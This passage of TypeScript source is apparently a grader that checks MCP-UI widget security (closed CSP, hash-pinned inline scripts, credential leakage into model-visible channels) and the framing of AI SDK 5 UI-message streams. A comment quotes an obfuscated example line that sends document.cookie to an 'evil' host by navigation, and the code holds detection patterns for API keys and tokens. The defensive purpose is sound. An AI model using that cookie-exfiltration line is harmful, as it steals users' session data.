 * `new Image().src`, dynamic `import()`, backtick `fetch`), so the PRIMARY
 * signal is ENFORCEMENT-based:
 *   - the widget MUST declare a closed CSP (default-src / no remote origin in
 *     script-src / connect-src / img-src). An un-CSP'd widget is NOT provably
 *     inert ⇒ FAIL — there is nothing for the host to enforce.
 * As a SECONDARY signal, the srcDoc is PARSED (not regexed) and any actual
 * EXECUTABLE external reference is flagged — network-loading element attributes
 * plus remote-URL literals in `<script>`/`<style>` bodies, covering
 * protocol-relative, backtick, sendBeacon/XHR/Image/WebSocket/EventSource/
 * dynamic-import. A URL merely DISPLAYED in text / `<pre>`/`<code>` / escaped
 * markup is NOT a reference and does not fail. This is best-effort, not a proof
 * of inertness; the closed CSP is the real boundary.
 * No claim ⇒ SKIP. An externalUrl widget is graded on the fetched page (or, when
 * not fetched, on the linkage check, not here).
 *
 * HONEST CEILING for hash-pinned INTERACTIVE islands (ax-coz): the closed CSP
 * (default-src + form-action + base-uri all present-and-restrictive, no remote
 * in any fetch directive, script execution hash-pinned) closes every
 * CSP-enforceable exfil surface — fetch/XHR/beacon/image/media/font/object/
 * worker loads, form submission, and `<base href>` rewriting. It does NOT, and
 * CANNOT, close plain top-level navigation: `location.href = "…"`,
 * `location.assign(...)`, `window.open(...)`, or a same-window `<a>` click to a
 * remote URL are ordinary document navigations, and no CSP directive
 * implemented in any shipping browser governs them — `navigate-to` was
 * specified in CSP3 but never shipped in any engine, so it is not a boundary
 * the grader can rely on. That means a hash-pinned island can still
 * `location.href = "ht"+"tps://evil/c?d="+document.cookie` and no CSP the host
 * enforces will stop the browser from making that navigation; the grader's
 * static scan of the srcDoc can flag a LITERAL `location.href = "https://…"`
 * assignment but is trivially defeated by string concatenation/obfuscation,
 * exactly like the pre-CSP exfil scan was. So an interactive island — unlike a
 * static, script-less widget, where the closed CSP genuinely IS a complete,
 * provable boundary — carries genuine residual navigation-exfil trust that NO
 * grader can close from the outside. The verdict below says so explicitly
 * rather than certifying an island as equivalently airtight to a static
 * widget; see the `[interactive: navigation-exfil not CSP-provable]` suffix on
 * the PASS detail. Do NOT attempt to "fix" this by blocking `location`/
 * `window.open` in the static scan as a primary defense — that only reproduces
 * the obfuscation-defeatable deny-list this function deliberately moved away
 * from. The closed CSP (default-src/form-action/base-uri + hash-pinning) is
 * the real, provable boundary; this ceiling is the honest limit of what any
 * static/CSP-based grader can prove about navigation.
 */
function judgeMcpUiSelfContained(ui: McpUiContext): { verdict: Verdict; detail: string } {
  if (!ui.claims) return { verdict: 'skip', detail: NOT_READY }
  // The HTML under scrutiny: the inline srcDoc, or (only when SAME-ORIGIN and
  // thus fetched) an externalUrl page. An off-origin externalUrl is never
  // fetched — self-containment is judged via linkage, not here.
  const html = ui.externalUrl ? ui.extEv?.body : ui.resource?.text
  if (typeof html !== 'string' || html.length === 0) {
    if (ui.externalUrl) return { verdict: 'skip', detail: `externalUrl UIResource ${ui.externalUrl} not fetched (off-origin, not proxied) — self-containment judged on the declared shape (see resource-linkage)` }
    return { verdict: 'fail', detail: `UIResource ${ui.linkedUri ?? '?'} carries no srcDoc HTML to render — an empty widget is not render-ready` }
  }
  const meta = ui.result?._meta
  const uiMeta = meta && typeof meta === 'object' ? ((meta as Record<string, unknown>).ui as Record<string, unknown> | undefined) : undefined
  const csp = uiMeta && typeof uiMeta.csp === 'object' && uiMeta.csp !== null ? (uiMeta.csp as Record<string, unknown>) : undefined
  // PRIMARY: a closed CSP is REQUIRED. An open (remote-admitting) CSP is the
  // worst case; a missing/empty CSP still fails — an un-CSP'd widget cannot be
  // proven inert.
  const cspOffenders = csp ? cspAdmitsRemote(csp) : []
  if (cspOffenders.length > 0) {
    return { verdict: 'fail', detail: `_meta.ui.csp is not closed: ${cspOffenders.slice(0, 3).join('; ')} — a widget CSP that admits a wildcard or remote origin defeats the host sandbox` }
  }
  if (!cspIsClosed(csp)) {
    return { verdict: 'fail', detail: `the widget declares no closed _meta.ui.csp (need default-src 'none'/'self' AND form-action 'none'/'self' AND base-uri 'none'/'self' — form-action/base-uri do not fall back to default-src per the CSP spec, so an absent or permissive form-action/base-uri leaves form-submission / <base href> exfil unconstrained) — an un-CSP'd widget cannot be proven self-contained; the host sandbox has no policy to enforce` }
  }
  // csp is defined & closed here (cspIsClosed returns false for undefined).
  const cspObj = csp as Record<string, unknown>
  // SCRIPT-EXECUTION SURFACE (island-safety). A browser applies the EFFECTIVE
  // directive, not literally `script-src`: for an inline `<script>` ELEMENT it
  // uses `script-src-elem ?? script-src ?? default-src`; for an inline event
  // handler / `javascript:` ATTRIBUTE it uses `script-src-attr ?? script-src ??
  // default-src`. So 'unsafe-inline'/'unsafe-eval' hidden in `script-src-elem`
  // (a benign hash sitting in `script-src`) would re-open injected inline script
  // yet grade safe if we only read `script-src`. Compute BOTH effective policies
  // and reject the unsafe keywords in EITHER. (A remote origin in any of these
  // was already caught by cspAdmitsRemote above.)
  const effInlinePolicy = cspDirective(cspObj, 'script-src-elem') ?? cspDirective(cspObj, 'script-src') ?? cspDirective(cspObj, 'default-src')
  const effAttrPolicy = cspDirective(cspObj, 'script-src-attr') ?? cspDirective(cspObj, 'script-src') ?? cspDirective(cspObj, 'default-src')
  const elemTokens = cspSourceTokens(effInlinePolicy)
  const attrTokens = cspSourceTokens(effAttrPolicy)
  const elemLower = elemTokens.map((t) => t.toLowerCase())
  const attrLower = attrTokens.map((t) => t.toLowerCase())
  if (elemLower.includes("'unsafe-inline'") || attrLower.includes("'unsafe-inline'")) {
    return { verdict: 'fail', detail: `_meta.ui.csp effective inline-script policy (script-src-elem/attr ?? script-src ?? default-src) admits 'unsafe-inline' — the host would execute ANY inline script/handler the srcDoc carries (or that is injected into it); a self-contained interactive island must pin each inline script by 'sha256-...' hash instead` }
  }
  if (elemLower.includes("'unsafe-eval'") || attrLower.includes("'unsafe-eval'")) {
    return { verdict: 'fail', detail: `_meta.ui.csp effective inline-script policy admits 'unsafe-eval' — string→code execution (eval / new Function) is an injection sink a self-contained widget must not enable` }
  }
  // SECONDARY: parse the srcDoc for actual executable external references
  // (element loads, remote url()/@import, and remote/beacon refs in script
  // bodies — this is what fails an island that fetch()es/beacons out).
  const refs = externalRefsInSrcDoc(html)
  if (refs.length > 0) {
    return { verdict: 'fail', detail: `ui:// srcDoc has executable external references: ${refs.slice(0, 4).join(', ')} — an element that loads or a script that beacons to a remote origin is a host-sandbox + supply-chain + exfil risk; the srcDoc must be self-contained (inline/precompiled, no remote refs)` }
  }
  // INLINE ISLAND: every src-less <script> must be HASH-PINNED. With an inline
  // script present, the EFFECTIVE script-src-elem policy (the directive the
  // browser uses for <script> ELEMENT hashes) must be a 'sha256-...' allow-list
  // ONLY (not 'none'/'self'/a nonce), and each script's own hash must be in it.
  // Compare hashes CANONICALIZED (base64url→base64, padding-normalized) so a
  // spec-valid browser-accepted hash form is not false-failed. An un-pinned or
  // hash-mismatched inline script would not execute under a correct host CSP and
  // is a red flag the grader must not certify as safe.
  const inlineScripts = inlineScriptBodies(html)
  if (inlineScripts.length > 0) {
    const hashSources = elemTokens.filter(isCspHashSource)
    if (hashSources.length === 0 || elemTokens.some((t) => !isCspHashSource(t))) {
      return { verdict: 'fail', detail: `the srcDoc ships ${inlineScripts.length} inline <script>(s) but the effective script-src-elem policy is not a 'sha256-...' hash allow-list (got: ${elemTokens.join(' ') || "'none'"}) — an inline island is self-contained ONLY when <script>-element execution is restricted to specific pinned hashes` }
    }
    const hashSet = new Set(hashSources.map(canonicalizeHashToken))
    for (const body of inlineScripts) {
      const h = canonicalizeHashToken(cspScriptHash(body))
      if (!hashSet.has(h)) {
        return { verdict: 'fail', detail: `an inline <script> is not hash-pinned: its ${cspScriptHash(body)} is absent from the effective script-src-elem hash set (${[...hashSet].join(' ')}) — under a correct host CSP it would not execute; the grader will not certify an un-pinned or hash-mismatched inline script as safe` }
      }
    }
    return pass(`srcDoc is self-contained: ${inlineScripts.length} inline island script(s) hash-pinned in script-src, no executable external refs, behind a closed CSP [interactive: navigation-exfil not CSP-provable]`)
  }
  return pass('srcDoc is self-contained (no executable external refs) behind a closed CSP')
}

/** Minimum length of a credential-named field's string value before it counts as a leak. */
const MIN_CRED_LEN = 8

/**
 * A field NAME that denotes a credential. A brand deny-list (sk-/ghp_/…) misses
 * generically-named secrets (refresh_token, session_token, auth, credential), so
 * this is a NAME-shaped ALLOW-list: any field whose (camelCase-normalized) name
 * ends in a credential word — token / secret / key / password / credential /
 * authorization / auth / session / cookie / private-key (and the *_token /
 * *_secret / *_key variants). Anchored at the END so `count`, `keyboard`,
 * `monkey`, `session_id` do NOT match.
 */
function nameLooksCredential(key: string): boolean {
  const norm = key.replace(/([a-z0-9])([A-Z])/g, '$1_$2').toLowerCase()
  return /(^|[_-])(tokens?|secrets?|keys?|password|passwd|pwd|credentials?|authorization|auth|session|cookie|private[_-]?key)$/.test(norm)
}

/** VALUE-shape heuristics — a string that LOOKS like a credential regardless of its field name. */
const VALUE_SECRET_PATTERNS: Array<[RegExp, string]> = [
  [/AIza[0-9A-Za-z_-]{20,}/, 'Google API key (AIza…)'],
  [/\bsk-[A-Za-z0-9]{16,}/, 'OpenAI-style secret key (sk-…)'],
  [/\bAKIA[0-9A-Z]{16}\b/, 'AWS access key id (AKIA…)'],
  [/\bgh[pousr]_[A-Za-z0-9]{20,}/, 'GitHub token (gh?_…)'],
  [/\bxox[baprs]-[A-Za-z0-9-]{10,}/, 'Slack token (xox…)'],
  [/-----BEGIN [A-Z ]*PRIVATE KEY-----/, 'PEM private key'],
  [/\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/, 'JWT (three-segment)'],
  [/\bBearer\s+[A-Za-z0-9._-]{16,}/, 'inline Bearer token'],
  // Dotted/opaque OAuth tokens the whole-string entropy scan cannot see (the `.`
  // breaks the contiguous-run test): a `ya29.` Google access token and a `1//`
  // Google refresh token, keyed on their high-confidence prefixes.
  [/\bya29\.[A-Za-z0-9_-]{20,}/, 'Google OAuth access token (ya29.…)'],
  [/\b1\/\/[0-9A-Za-z_-]{20,}/, 'Google OAuth refresh token (1//…)'],
]

/** A UUID — a benign identifier shape that must NOT be mistaken for a credential. */
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i

/**
 * An opaque (dot-free) string that looks like a credential: ≥32 chars of
 * base64/hex/opaque bytes, mixed character classes, with a long CONTIGUOUS run
 * (so hyphenated identifiers and UUIDs — benign IDs — do NOT trip it).
 */
function isOpaqueHighEntropy(s: string): boolean {
  if (s.length < 32) return false
  if (!/^[A-Za-z0-9+/=_-]+$/.test(s)) return false
  if (UUID_RE.test(s)) return false
  const longestRun = Math.max(...s.split(/[_\-+/=]+/).map((r) => r.length))
  if (longestRun < 24) return false // a UUID's longest hex run is 12 → excluded
  const classes = (/[a-z]/.test(s) ? 1 : 0) + (/[A-Z]/.test(s) ? 1 : 0) + (/[0-9]/.test(s) ? 1 : 0)
  return classes >= 2
}

/**
 * Benign DOTTED shapes that must never read as a credential even if a segment
 * were long: a hostname/domain (`foo.example.com`), a version string
 * (`1.2.3`, `v1.2.3-beta.4`). A real opaque OAuth token body carries digits and
 * so never matches an all-letters TLD or an all-numeric version.
 */
function looksBenignDotted(s: string): boolean {
  if (/^v?\d+(?:\.\d+)+(?:[.-][0-9A-Za-z-]+)*$/.test(s)) return true // version
  if (/^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/i.test(s)) return true // hostname/domain
  return false
}

/**
 * A single WHITESPACE-delimited token that looks like an opaque credential.
 * Whole-string first; then DOT-AWARE — a benign dotted string (domain, version,
 * short-segment field path) is left alone, but a long opaque MIXED-alnum segment
 * (e.g. the body after a `ya29.`/`1//` prefix) is still caught. The per-segment
 * bar requires BOTH a digit and a letter so a dotted field path (`a.b.c`), a
 * reverse-DNS/package path, or a CamelCase class name does NOT trip it.
 */
function looksHighEntropy(raw: string): boolean {
  const s = raw.trim()
  if (isOpaqueHighEntropy(s)) return true
  if (s.includes('.') && !looksBenignDotted(s)) {
    for (const seg of s.split('.')) {
      if (isOpaqueHighEntropy(seg) && /[0-9]/.test(seg) && /[A-Za-z]/.test(seg)) return true
    }
  }
  return false
}

/**
 * A WELL-FORMED `data:` URI — `data:<mime>[;param=val…][;base64],<payload>`. A
 * data: URI is inline CONTENT (an embedded image/font/SVG), NOT a credential:
 * its base64 payload is high-entropy by nature and must not, by its ENTROPY
 * ALONE, read as a leaked secret. This is a narrow benign-SHAPE guard (like
 * `looksBenignDotted`) — it exempts a data: URI from the entropy heuristic only;
 * the VALUE_SECRET_PATTERNS scan (raw + decoded payload) still applies, so a
 * credential SMUGGLED inside a data: URI is still caught. Anchored at the start
 * and requiring a `<type>/<subtype>` media type + a comma, so a bare `data:`
 * prefix or an arbitrary base64 blob does NOT qualify.
 */
const DATA_URI_RE = /^data:[a-z0-9.+-]+\/[a-z0-9.+-]+(?:;[a-z0-9-]+=[^,;]*)*(;base64)?,/i

/** Cap on the base64 payload we decode-and-scan (bytes of base64 text), bounding cost. */
const MAX_DATA_URI_B64 = 256 * 1024

/** Parse a well-formed data: URI, returning its base64 flag + raw payload, else null. */
function parseWellFormedDataUri(s: string): { base64: boolean; payload: string } | undefined {
  const m = DATA_URI_RE.exec(s)
  if (!m) return undefined
  return { base64: Boolean(m[1]), payload: s.slice(m[0].length) }
}

/**
 * Decode a base64 data: URI payload to a byte-preserving (latin1) string for a
 * credential-pattern scan. BOUNDED: only the first MAX_DATA_URI_B64 chars are
 * decoded (a whole 4-char-aligned slice), so a huge embedded image is not fully
 * expanded. Returns undefined on undecodable input.
 */
function decodeDataUriBase64(payload: string): string | undefined {
  let b64 = payload.length > MAX_DATA_URI_B64 ? payload.slice(0, MAX_DATA_URI_B64) : payload
  b64 = b64.replace(/[^A-Za-z0-9+/=]/g, '') // strip whitespace/newlines a data: payload may carry
  b64 = b64.slice(0, b64.length - (b64.length % 4)) // 4-char align so atob never rejects a sliced tail
  if (!b64) return undefined
  try {
    return atob(b64)
  } catch {
    return undefined
  }
}

/**
 * A credential label if `s` — or any whitespace-delimited token WITHIN it —
 * matches a value-shape heuristic, else undefined. Tokenizing catches a
 * credential embedded in narration text (e.g. `content[].text`), not only a
 * value that IS the credential.
 */
function valueSecretLabel(s: string): string | undefined {
  // Known credential SHAPES always win — scanned against the raw text first, so a
  // data: URI whose RAW payload carries e.g. `ya29.…`/`AKIA…` is caught regardless.
  for (const [re, label] of VALUE_SECRET_PATTERNS) if (re.test(s)) return label
  // Benign-shape guard: a value that IS a well-formed data: URI is inline content,
  // EXEMPT from the entropy heuristic (its base64 payload is high-entropy by
  // nature). Still scan the DECODED base64 payload for known credential patterns
  // so a key smuggled as `data:text/plain;base64,<sk-…>` is not laundered through.
  const dataUri = parseWellFormedDataUri(s.trim())
  if (dataUri) {
    if (dataUri.base64) {
      const decoded = decodeDataUriBase64(dataUri.payload)
      if (decoded) for (const [re, label] of VALUE_SECRET_PATTERNS) if (re.test(decoded)) return `${label} (base64-encoded inside a data: URI)`
    }
    return undefined
  }
  for (const tok of s.split(/[\s"'`<>(){}\[\],;]+/)) {
    if (looksHighEntropy(tok)) return 'high-entropy credential-like string'
  }
  return undefined
}

/** A credential-named field is a leak once it actually carries a non-trivial string value. */
function credentialValuePresent(v: unknown): boolean {
  if (typeof v === 'string') return v.trim().length >= MIN_CRED_LEN
  return false
}

function walkForSecrets(value: unknown, path: string, hits: string[]): void {
  if (typeof value === 'string') {
    const label = valueSecretLabel(value)
    if (label) hits.push(`${label}${path ? ` at ${path}` : ''}`)
    return
  }
  if (Array.isArray(value)) {
    value.forEach((el, idx) => walkForSecrets(el, `${path}[${idx}]`, hits))
    return
  }
  if (value && typeof value === 'object') {
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      const child = path ? `${path}.${k}` : k
      if (nameLooksCredential(k) && credentialValuePresent(v)) hits.push(`credential-named field \`${k}\``)
      walkForSecrets(v, child, hits)
    }
  }
}

/**
 * Model-visible values that carry a leaked credential. Credential-SHAPED: it
 * flags (a) any field whose NAME denotes a credential and carries a real value,
 * and (b) any VALUE that matches a credential shape (AIza…/sk-/AKIA/gh?_/xox/
 * PEM/JWT/Bearer/high-entropy). Recurses through objects AND arrays, so a
 * `structuredContent` object is scanned as JSON and each `content[].text` string
 * is scanned as text.
 */
function secretsIn(value: unknown): string[] {
  const hits: string[] = []
  walkForSecrets(value, '', hits)
  return hits
}

/**
 * (3) Envelope hygiene (HIGH). The three-way split — structuredContent (model +
 * widget), content (model narration), _meta (widget-only) — must not leak a
 * secret into a MODEL-VISIBLE channel. A token/key in `content` or
 * `structuredContent` ⇒ FAIL (it is exfiltrated to the model/agent transcript).
 * `_meta` is widget-only and not scanned here. No claim ⇒ SKIP.
 */
function judgeMcpUiEnvelopeHygiene(ui: McpUiContext): { verdict: Verdict; detail: string } {
  if (!ui.claims) return { verdict: 'skip', detail: NOT_READY }
  if (!ui.result) return { verdict: 'skip', detail: 'MCP-UI claimed but no tool result recorded — nothing to inspect for envelope hygiene' }
  const modelVisible: Array<[string, unknown]> = [
    ['structuredContent', ui.result.structuredContent],
    ['content', ui.result.content],
  ]
  for (const [channel, value] of modelVisible) {
    if (value === undefined) continue
    const hits = secretsIn(value)
    if (hits.length > 0) {
      return { verdict: 'fail', detail: `a secret (${hits[0]}) leaks into the model-visible \`${channel}\` channel — model-visible channels must never carry credentials; secrets belong only in the widget-only _meta` }
    }
  }
  return pass('no secret detected in the model-visible content/structuredContent channels')
}

/** Deep key/value conflicts between two objects (same key present in both, different value). */
function conflictingKeys(a: unknown, b: unknown, prefix = ''): string[] {
  if (!a || !b || typeof a !== 'object' || typeof b !== 'object' || Array.isArray(a) !== Array.isArray(b)) return []
  const out: string[] = []
  const ao = a as Record<string, unknown>
  const bo = b as Record<string, unknown>
  for (const key of Object.keys(ao)) {
    if (!(key in bo)) continue
    const av = ao[key]
    const bv = bo[key]
    const path = prefix ? `${prefix}.${key}` : key
    if (av && bv && typeof av === 'object' && typeof bv === 'object') {
      out.push(...conflictingKeys(av, bv, path))
    } else if (JSON.stringify(av) !== JSON.stringify(bv)) {
      out.push(`${path} (${JSON.stringify(av)} ≠ ${JSON.stringify(bv)})`)
    }
  }
  return out
}

/**
 * (4) Three-register parity. The widget's data must be CONSISTENT with the
 * agent/API register — the widget must not show different data than the twin.
 * `structuredContent` is the model+widget register; any widget-only data payload
 * (`_meta.ui.data` / `_meta.ui.props`) must not CONTRADICT it. A conflicting key
 * ⇒ FAIL (the widget renders divergent data from what the agent/API sees). When
 * MCP-UI is claimed but there is NO structuredContent for the widget/model to
 * share, there is nothing byte-consistent to render ⇒ FAIL. No claim ⇒ SKIP.
 */
function judgeMcpUiRegisterParity(ui: McpUiContext): { verdict: Verdict; detail: string } {
  if (!ui.claims) return { verdict: 'skip', detail: NOT_READY }
  if (!ui.result) return { verdict: 'skip', detail: 'MCP-UI claimed but no tool result recorded — nothing to check parity against' }
  const structured = ui.result.structuredContent
  const meta = ui.result._meta
  const uiMeta = meta && typeof meta === 'object' ? ((meta as Record<string, unknown>).ui as Record<string, unknown> | undefined) : undefined
  const widgetData = uiMeta ? (uiMeta.data ?? uiMeta.props) : undefined
  if (widgetData !== undefined && (structured === undefined || structured === null)) {
    return { verdict: 'fail', detail: 'the widget renders from a _meta.ui data payload but the tool result carries NO structuredContent — the widget register has no agent/API twin to be consistent with (register divergence)' }
  }
  if (widgetData !== undefined && structured !== undefined) {
    const conflicts = conflictingKeys(widgetData, structured)
    if (conflicts.length > 0) {
      return { verdict: 'fail', detail: `widget data diverges from the agent/API register (structuredContent): ${conflicts.slice(0, 4).join('; ')} — the widget must show the same data as the json/markdown twin` }
    }
  }
  if (structured === undefined || structured === null) {
    return { verdict: 'fail', detail: 'MCP-UI is claimed but the tool result carries no structuredContent — the widget has no byte-consistent state shared with the model/API register' }
  }
  return pass('widget structuredContent is present and consistent with the agent/API register (no divergence)')
}

/**
 * (5) Host-render readiness. The widget should render on first turn WITHOUT user
 * input (no required tool inputs), and the tool should carry the host-facing
 * affordances a host needs: a description / `widgetDescription` and annotations.
 * No claim ⇒ SKIP. Claims but requires input to first-render, or lacks a
 * description/annotations ⇒ FAIL (a widget the host cannot present unprompted).
 */
function judgeMcpUiHostRender(ui: McpUiContext): { verdict: Verdict; detail: string } {
  if (!ui.claims) return { verdict: 'skip', detail: NOT_READY }
  const tool = ui.uiTool ?? {}
  const inputSchema = tool.inputSchema && typeof tool.inputSchema === 'object' ? (tool.inputSchema as Record<string, unknown>) : undefined
  const required = Array.isArray(inputSchema?.required) ? (inputSchema!.required as unknown[]) : []
  if (required.length > 0) {
    return { verdict: 'fail', detail: `the UI tool requires input(s) [${required.join(', ')}] before it can be called — the widget cannot first-render without user input, so the host cannot present it unprompted` }
  }
  const meta = tool._meta && typeof tool._meta === 'object' ? (tool._meta as Record<string, unknown>) : undefined
  const uiMeta = meta && typeof meta.ui === 'object' && meta.ui !== null ? (meta.ui as Record<string, unknown>) : undefined
  const widgetDescription = typeof uiMeta?.widgetDescription === 'string' && uiMeta.widgetDescription.length > 0
  const hasDescription = typeof tool.description === 'string' && tool.description.length > 0
  const hasAnnotations = tool.annotations && typeof tool.annotations === 'object' && Object.keys(tool.annotations as Record<string, unknown>).length > 0
  if (!widgetDescription && !hasDescription && !hasAnnotations) {
    return { verdict: 'fail', detail: 'the UI tool declares no description, widgetDescription, or annotations — the host has no affordance text to present the widget trustworthily' }
  }
  return pass(`first-render tolerant (no required inputs) with ${widgetDescription ? 'widgetDescription' : hasDescription ? 'a description' : 'annotations'} for the host`)
}

// ---------------------------------------------------------------------------
// AI SDK 5 UI-message-stream readiness (ax-rx1) — the streaming (SSE) analog of
// the mcp-ui-* dimension. PURE over the observed stream body + declared JSON
// twin. Enforcement-first: a declared-but-broken stream FAILs; a target with no
// stream evidence (no declared face) SKIPs every sub-check.
// ---------------------------------------------------------------------------

const NOT_READY_STREAM =
  'no UI-message-stream face declared (no interfaces.uiMessageStream) — informational not-ready, not a failure'

interface UiStreamContext {
  /** The target declared a UI-message-stream face ⇒ stream evidence was recorded. */
  declared: boolean
  /** The stream endpoint actually returned a body to inspect. */
  streamOk: boolean
  /** The stream response carried a 2xx status — an AI SDK host checks `response.ok`. */
  statusOk: boolean
  status: number | null
  /** The `x-vercel-ai-ui-message-stream` response header value (expected `v1`). */
  header?: string
  contentType?: string | null
  /** Structural SSE-framing problems (non-`data:` line, bad [DONE], parse/type errors). */
  framingErrors: string[]
  /** A bare `data: [DONE]` was the final event. */
  doneTerminal: boolean
  /** Parsed parts that carry a string `type` discriminator, in stream order. */
  parts: Record<string, unknown>[]
  /** A usable (JSON-parseable) twin projection is observable for parity. */
  twinPresent: boolean
  twin?: unknown
}

/** content-type is an SSE stream (text/event-stream, charset-tolerant). */
function isEventStream(ct: string | null | undefined): boolean {
  return typeof ct === 'string' && /text\/event-stream/i.test(ct)
}

function buildUiStreamContext(
  streamEv: Evidence | undefined,
  twinEv: Evidence | undefined,
): UiStreamContext {
  if (!streamEv) {
    return { declared: false, streamOk: false, statusOk: false, status: null, framingErrors: [], doneTerminal: false, parts: [], twinPresent: false }
  }
  const status = streamEv.status
  const body = streamEv.body
  const streamOk = status !== null && body !== null
  const statusOk = status !== null && status >= 200 && status < 300
  const header = streamEv.headers['x-vercel-ai-ui-message-stream']
  const contentType = streamEv.contentType
  const framingErrors: string[] = []
  const parts: Record<string, unknown>[] = []
  let doneTerminal = false

  if (streamOk) {
    // SSE events are separated by a blank line. Each AI SDK 5 UI-message-stream
    // event is exactly `data: {json}\n\n`, with a bare `data: [DONE]\n\n` terminal.
    const seq: Array<'part' | 'done'> = []
    // Strip a leading UTF-8 BOM (a valid SSE stream prelude) before splitting.
    for (const raw of (body as string).replace(/^\uFEFF/, '').split(/\r?\n\r?\n/)) {
      const evText = raw.replace(/\r/g, '').replace(/^\uFEFF/, '')
      if (evText.trim() === '') continue
      const dataLines: string[] = []
      let lineBad = false
      for (const line of evText.split('\n')) {
        if (line === '' || line.startsWith(':')) continue // blank / SSE comment (keep-alive)
        if (line.startsWith('data:')) { dataLines.push(line.slice('data:'.length).replace(/^ /, '')); continue }
        // The other STANDARD SSE line fields — event:, id:, retry:. They are not
        // part of the UI-message-stream payload, so they are ignored for grading
        // (non-fatal), not treated as malformed framing.
        if (/^(event|id|retry):/.test(line)) continue
        framingErrors.push(`SSE event carries a non-\`data:\` line (${JSON.stringify(line.slice(0, 40))}) — each chunk must be \`data: {json}\\n\\n\``)
        lineBad = true
      }
      if (lineBad || dataLines.length === 0) continue
      const payload = dataLines.join('\n')
      if (payload === '[DONE]') { seq.push('done'); continue }
      if (/^["'`]\[DONE\]["'`]$/.test(payload)) {
        framingErrors.push('the stream terminal is quoted (`data: "[DONE]"`) — the [DONE] sentinel must be a BARE `data: [DONE]`, not a JSON/quoted string')
        continue
      }
      let parsed: unknown
      try { parsed = JSON.parse(payload) } catch {
        framingErrors.push(`a data payload is not valid JSON: ${JSON.stringify(payload.slice(0, 60))}`)
        continue
      }
      if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
        framingErrors.push(`a data payload is not a JSON object part: ${JSON.stringify(payload.slice(0, 60))}`)
        continue
      }
      const type = (parsed as Record<string, unknown>).type
      if (typeof type !== 'string' || type.length === 0) {
        framingErrors.push(`a data payload has no string \`type\` discriminator: ${JSON.stringify(payload.slice(0, 60))}`)
        continue
      }
      seq.push('part')
      parts.push(parsed as Record<string, unknown>)
    }
    const doneCount = seq.filter((s) => s === 'done').length
    if (doneCount === 0) {
      framingErrors.push('the stream has no `data: [DONE]` terminal — an AI SDK 5 UI message stream must close with a bare [DONE]')
    } else {
      if (seq[seq.length - 1] !== 'done') framingErrors.push('the `data: [DONE]` terminal is not the final event — [DONE] must be the last frame')
      if (doneCount > 1) framingErrors.push('the stream carries more than one `data: [DONE]` terminal')
    }
    doneTerminal = doneCount >= 1 && seq[seq.length - 1] === 'done'
  }

  let twin: unknown
  if (twinEv && twinEv.status !== null && twinEv.body !== null) {
    try { twin = JSON.parse(twinEv.body) } catch { /* invalid twin JSON ⇒ no usable twin ⇒ parity SKIPs */ }
  }
  return { declared: true, streamOk, statusOk, status, header, contentType, framingErrors, doneTerminal, parts, twinPresent: twin !== undefined, twin }
}

/** typeof === 'string' && non-empty. */
function isNonEmptyStr(o: Record<string, unknown>, field: string): boolean {
  return typeof o[field] === 'string' && (o[field] as string).length > 0
}
/** The key is present with a defined value. */
function fieldPresent(o: Record<string, unknown>, field: string): boolean {
  return field in o && o[field] !== undefined
}

/**
 * Validate one UI-message-stream part against its AI SDK 5 shape. Returns an
 * error message when the type is unknown or a required field is wrong/missing
 * (flagging the classic renames: `textDelta`→`delta`, `args`→`input`,
 * `result`→`output`, `argsTextDelta`→`inputTextDelta`), else undefined.
 */
function uiStreamPartShapeError(p: Record<string, unknown>): string | undefined {
  const type = p.type as string
  switch (type) {
    case 'start':
    case 'start-step':
    case 'finish-step':
    case 'finish':
    case 'abort':
      return undefined // lifecycle markers — no required payload fields
    case 'error':
      return isNonEmptyStr(p, 'errorText') ? undefined : 'error part is missing a string `errorText`'
    case 'text-start':
      return isNonEmptyStr(p, 'id') ? undefined : 'text-start is missing a string `id`'
    case 'text-delta':
      if (!isNonEmptyStr(p, 'id')) return 'text-delta is missing a string `id`'
      if (fieldPresent(p, 'textDelta') && !fieldPresent(p, 'delta')) return 'text-delta uses `textDelta` — an AI SDK 5 UI-message-stream text-delta carries `delta`'
      return typeof p.delta === 'string' ? undefined : 'text-delta is missing a string `delta`'
    case 'text-end':
      return isNonEmptyStr(p, 'id') ? undefined : 'text-end is missing a string `id`'
    case 'tool-input-start':
      if (!isNonEmptyStr(p, 'toolCallId')) return 'tool-input-start is missing a string `toolCallId`'
      return isNonEmptyStr(p, 'toolName') ? undefined : 'tool-input-start is missing a string `toolName`'
    case 'tool-input-delta':
      if (!isNonEmptyStr(p, 'toolCallId')) return 'tool-input-delta is missing a string `toolCallId`'
      if (fieldPresent(p, 'argsTextDelta') && !fieldPresent(p, 'inputTextDelta')) return 'tool-input-delta uses `argsTextDelta` — an AI SDK 5 tool-input-delta carries `inputTextDelta`'
      return typeof p.inputTextDelta === 'string' ? undefined : 'tool-input-delta is missing a string `inputTextDelta`'
    case 'tool-input-available':
      if (!isNonEmptyStr(p, 'toolCallId')) return 'tool-input-available is missing a string `toolCallId`'
      if (!isNonEmptyStr(p, 'toolName')) return 'tool-input-available is missing a string `toolName`'
      if (fieldPresent(p, 'args') && !fieldPresent(p, 'input')) return 'tool-input-available uses `args` — an AI SDK 5 tool-input-available carries `input`'
      return fieldPresent(p, 'input') ? undefined : 'tool-input-available is missing `input`'
    case 'tool-output-available':
      if (!isNonEmptyStr(p, 'toolCallId')) return 'tool-output-available is missing a string `toolCallId`'
      if (fieldPresent(p, 'result') && !fieldPresent(p, 'output')) return 'tool-output-available uses `result` — an AI SDK 5 tool-output-available carries `output`'
      return fieldPresent(p, 'output') ? undefined : 'tool-output-available is missing `output`'
    default:
      if (type.startsWith('data-')) {
        return fieldPresent(p, 'data') ? undefined : `data part \`${type}\` is missing its \`data\` field`
      }
      return `unknown part type \`${type}\` — not an AI SDK 5 UI-message-stream part shape`
  }
}

/** Recursive key-sorted canonical stringify for order-independent JSON equality. */
function canonicalPartJson(v: unknown): string {
  if (v === null || typeof v !== 'object') return JSON.stringify(v) ?? 'null'
  if (Array.isArray(v)) return `[${v.map(canonicalPartJson).join(',')}]`
  const o = v as Record<string, unknown>
